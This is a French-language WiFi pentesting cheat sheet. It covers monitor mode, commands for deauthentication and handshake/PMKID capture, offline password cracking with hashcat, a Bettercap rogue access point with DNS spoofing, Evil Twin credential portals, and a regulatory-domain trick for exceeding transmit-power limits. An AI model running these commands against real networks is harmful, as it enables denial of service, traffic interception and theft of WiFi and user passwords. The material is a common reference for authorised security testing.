# Wifi basics

## Tools

* [Aircrack-ng](https://www.aircrack-ng.org/downloads.html)

* [Bettercap](https://github.com/bettercap/bettercap)

* [Kismet](https://www.kismetwireless.net/)

* [WiFi Pineapple](https://shop.hak5.org/collections/wifi-pentesting)

* [Alfa Card Drivers](https://files.alfa.com.tw/)

* [HackRF](https://greatscottgadgets.com/hackrf/one/)

* [ESP32 Marauder](https://github.com/justcallmekoko/ESP32Marauder)

## Definitions

| Terme      | Signification |
|------------|----------------|
| AP         | Access Point   |
| ESSID      | Extended Service Set Identifier (Identifiant de Service Étendu) |
| BSSID      | Basic Service Set Identifier (Identifiant de Service de Base) |
| SSID       | Service Set Identifier (Identifiant de Service) |
| Channels   | Peut fonctionner de 1 à 14, et aux États-Unis de 1 à 11 |
| Power      | Distance par rapport au signal |
| Security   | WEP, WPA1, WPA2, WPA3 |
| Modes      | Managed, Master, Master |
| Frequency  | 2.4GHz ou 5GHz |

## Modulation

ASK, FSK, PSK
OFDM : Orthogonal Frequency Division Multiplexing
DSSS : Direct-Sequence Spread Spectrum
FHSS : Frequency Hopping Spread Spectrum

## Cryptographie

| Normes | Authent | Algorithmes | IV (bits) | Clé (bits) |
|-------|------|-------------|--|--|
| WEP (obsolète) || RC4 | 24 | 40..104 |
| WPA  (obsolète)| RC4 TKIP | 48 | 128 |
| WPA2 | PSK | AES-CCMP | 48 | 128 |
| WPA2 entreprise | 802.1X/EAP | AES CCMP |||
| WPA3 | SAE+FS/PFS | AES-CCMP/AES-GCMP | 48 | 128..256 |
| WPA3 entreprise | 802.1X/EAP | GCMP | AES |||

> [!IMPORTANT]  
> Attention à WPA3-personal, censé renforcer WPA2, certaines vulnérabilités sont connues via le protocole SAE. (ex : CertID VU871675, CVE-2019-9494, CVE-2019-9494, CertID VU871675)

## Standards

| Standard     | Fréquence    | Débit maximal théorique | Portée maximale | Année d'introduction |
|--------------|--------------|-------------------------|-----------------|----------------------|
| IEEE 802.11  | 2.4 GHz      | 2 Mbps                  | ~20 m           | 1997                 |
| IEEE 802.11a | 5 GHz        | 54 Mbps                 | ~35 m           | 1999                 |
| IEEE 802.11b | 2.4 GHz      | 11 Mbps                 | ~35 m           | 1999                 |
| IEEE 802.11g | 2.4 GHz      | 54 Mbps                 | ~38 m           | 2003                 |
| IEEE 802.11n | 2.4 GHz / 5 GHz | 600 Mbps           | ~70 m           | 2009                 |
| IEEE 802.11ac| 5 GHz        | 1.3 Gbps                | ~70 m           | 2013                 |
| IEEE 802.11ad| 60 GHz       | 7 Gbps                  | ~10 m           | 2012                 |
| IEEE 802.11ax| 2.4 GHz / 5 GHz / 6 GHz | 10 Gbps    | ~300 m (outdoor)| 2019                 |
| IEEE 802.11ay| 60 GHz       | 20 Gbps                 | ~300 m (outdoor)| 2021                 |
| IEEE 802.11be| 2.4 GHz / 5 GHz / 6 GHz | 23 Gbps    | ~300 m (outdoor)| 2024                 |

## Canaux

Connaitre le lien canal-fréquence permet d'utiliser des outils software defined radio (SDR) en complément des cartes wifi. Cela permet de détecter et trianguler les points d'accès malveillants.

| Freq | nb | pas |
|------|--------------|-----|
| 2.4 GHz | 13 (14 au Japon) | 5 MHz |
| 5 GHz | 22 | 20 MHz |

### valeurs

| id | Freq (GHz) |
|----|------|
| 1 | 2.412 |
| 2 | 2.417 |
| 3 | 2.422 |
| 4 | 2.427 |
| 5 | 2.432 |
| 6 | 2.437 |
| 7 | 2.442 |
| 8 | 2.447 |
| 9 | 2.452 |
| 10 | 2.457 |
| 11 | 2.462 |
| 12 | 2.467 |
| 13 | 2.472 |
| 14 | 2.484 |
| 32    | 5.160  |
| 36    | 5.180  |
| 40    | 5.200  |
| 44    | 5.220  |
| 48    | 5.240  |
| 52    | 5.260  |
| 56    | 5.280  |
| 60    | 5.300  |
| 64    | 5.320  |
| 68    | 5.340  |
| 96    | 5.480  |
|100    | 5.500  |
|104    | 5.520  |
|108    | 5.540  |
|112    | 5.560  |
|116    | 5.580  |
|120    | 5.600  |
|124    | 5.620  |
|128    | 5.640  |
|132    | 5.660  |
|136    | 5.680  |
|140    | 5.700  |

> [!IMPORTANT]  
> 6GHz : interdit en France

## Principales attaques

* Deauth pour le Deni de service ou capture de hanshakes

* Rogue AP, Evil Twin (Clone) pour la mise en place d'un MITM

* Captures Handshakes pour cracker le mot de passe

* PMKID (attaques similaires au handshake permettant le brute-force offline)

## WarDraving

* [Wigle](https://wigle.net/)

* [Wigle Android App](https://play.google.com/store/apps/details?id=net.wigle.wigleandroid&hl=fr)

## Le mode monitor

Permets la capture et l'analyse du trafic wifi

### Linux

Activer le mode `monitor`, (la carte wifi doit être compatible)

```sh
ip link set wlan0 down
iw dev wlan0 set type monitor
ip link set wlan0 up
```

anciens Linux :

```sh
ifconfig wlan0 down
iwconfig wlan0 mode monitor
fconfig wlan0 up
```

Debug en cas d'utilisation de la carte qui empêche le passe en mode monitor :

```sh
nmcli nm wifi off
sudo rfkill unblock all
```

Pour fixer la puissance d'émission :

```sh
sudo iw reg set BO #pas de règle en zone Bolivie
iw wlan0 set txpower fixed 3000
```

### Windows

> [!TIP]
> Wireshark propose directement l'option "mode monitor" dans une case à cocher.

```batch
netsh wlan show interfaces
```

* [Npcap](https://npcap.com/#download)

Le binaire se trouve dans `C:\Windows\System32\Npcap`

```powershell
.\WlanHelper.exe "wi-fi" mode monitor
```

à défaut d'une carte et de drivers compatibles, il faudra se contenter d'une énumération sommaire

> [!TIP]
> se déconnecter de son AP wifi pour lister l'ensemble des réseaux

```batch
netsh wlan show networks
netsh wlan show networks mode=bssid
netsh wlan show networks mode=ssid
```

lister les profils de la machine :

```batch
netsh wlan show profiles
netsh wlan show profiles name=<SSID>
```

## Kismet

Supporte à la fois les `cartes wifi monitorables` et les materiels `SDR` comme le HackRF one.

## Aicrack-ng

### Hidden AP

* Le mode `monitor` permet de sniffer l'ensemble du trafic (pas uniquement les beacons) et de détecter les wifi "cachés". On peut ensuite utiliser `airodump`

* *Alternative pour redescendre sur les couches basses* : on peut aussi procéder par analyse de spectre et antenne directionnelle pour trouver la source d'émission. cf. HackRF.

### Ecoute en mode monitor

Sur la bande 2.4 GHz

```sh
airodump-ng <interface> --band bg
```

Sur du 5 GHz

```sh
airodump-ng <interface> --band a
```

### capture dans un fichier

Cette méthode offre notamment la possibilité de capturer les handshakes WPA2 en vue d'une attaque par force brute.

```sh
airodump-ng --essid <nom AP> -c <channel> -w capture-file wlan1
airodump-ng --bssid <mac AP> -c <channel> -w capture-file wlan1
```

### deauth (broadcast)

```sh
sudo aireplay-ng --deauth 30 -a <mac AP> wlan1
```

### deauth ciblée

```sh
sudo aireplay-ng --deauth 30 -a <mac AP> -c <mac Client> wlan1
```

### brute force d'un handshake capturé

```sh
aircrack-ng.exe -w wordlist.txt file.cap
```

### PMKID

> [!TIP]
> WiFi 6/WPA3 normalement PMKID Prood, pas mal d'équipements patché depuis 2018...

Avec `hcxtools` :

```sh
# passage en mode monitor au préalable, existe aussi hcxdumptool -m wlan0 
apt install hcxtools hcxdumptool hashcat
sudo hcxdumptool -i wlan0 -o capture.pcapng -F
```

Avec `BetterCap`

```sh
bettercap -iface wlan0
set wifi.interface wlan0
wifi.recon on
wifi.recon.channel 6
wifi.assoc <all | bssid>
get wifi.handshakes.file
```

si on a : `[wifi.client.handshake] 11:22:33:44:55:66 -> 77:88:99:AA:BB:CC [RSN PMKID]`, c'est gagné. les hash sont dans `/root/bettercap-wifi-handshakes.pcap`

Pour cracker les hash :

```sh
hcxpcapngtool -o hash_pour_crack.22000 capture.pcapng
hashcat -m 22000 hash_pour_crack.22000 /usr/share/wordlists/rockyou.txt
```

### Rogue AP

via `Bettercap` :

```sh
bettercap -iface wlan0
set wifi.ap.ssid "Mon_Reseau_Test"
set wifi.ap.channel 1
set wifi.ap.encryption false
wifi.recon on
wifi.ap
dhcp6.status on
dns.spoof on
net.sniff on
set net.sniff.verbose true
wifi.show
wifi.deauth <bssid-legit>
```

Alternative à `BetterCap` :

* [WifiPumpkin3](https://github.com/P0cL4bs/wifipumpkin3)

* [Wifiphisher](https://github.com/wifiphisher/wifiphisher)

## Antenne Wifi directionnelle

À partir d'une boite de conserve.

1. le - du câble est connecté à la boite de conserve
2. le + est isolé et dépasse au milieu de la boite

```txt
L : 175 mm (Largeur du réflecteur)
┌───────────────────────────────────────────────┐
│                                               │
│                                               │ H : 100 mm
│      (Point focal / Élément actif)            │ (Hauteur)
│             ▲                                 │
│             │ 31 mm (Picot/Radiateur)         │
│             │                                 │
│   < 44 mm > ┴                                 │
└─────────────┬─────────────────────────────────┘
              │
              ▼ Câble Coaxial (RG-58 / LMR-195)
```

## PINEAPPLE MARK VII

une fois branché: `http://172.16.42.1:1471/#/Login`

default passwd: `hak5pineapple`

### Campagnes

Possibilités de faire des campagnes de différents types pour tester le niveau de sécurité

### Evil Twin

possibilité de faire:

* un bruteforce des half handshake capturé
* un portail captif pour récupérer les mots de passe
